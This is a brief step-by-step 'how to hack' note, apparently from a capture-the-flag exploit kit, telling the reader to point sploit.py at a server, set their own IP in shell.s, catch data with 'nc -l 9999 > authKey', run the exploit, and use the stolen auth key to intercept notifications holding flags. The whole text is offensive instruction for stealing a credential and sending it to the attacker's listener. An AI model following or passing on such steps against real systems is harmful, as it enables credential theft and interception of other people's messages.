How to hack:
1. fix ip address of server in sploit.py
2. change ip address to yours in shell.s
3. run nc -l 9999 > authKey
4. ./sploit.py
5. xxd authKey - is stolen auth key
6. use auth key to intercept notifications, some of them contains flag